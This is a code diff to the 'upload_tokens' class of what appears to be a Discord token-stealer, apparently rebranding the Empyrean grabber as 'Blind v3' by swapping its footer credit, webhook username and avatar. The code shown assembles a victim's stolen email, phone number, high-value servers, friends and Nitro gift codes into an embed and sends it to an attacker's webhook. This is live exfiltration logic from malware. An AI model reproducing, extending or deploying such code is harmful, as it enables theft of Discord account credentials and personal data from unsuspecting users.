@@ -351,7 +351,6 @@ class upload_tokens:
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
-            embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_guilds != None:
                 embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
@@ -360,11 +359,10 @@ class upload_tokens:
             if hq_friends != None:
                 embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
-
             if codes != None:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="created by: readdone#9772")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Blind v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
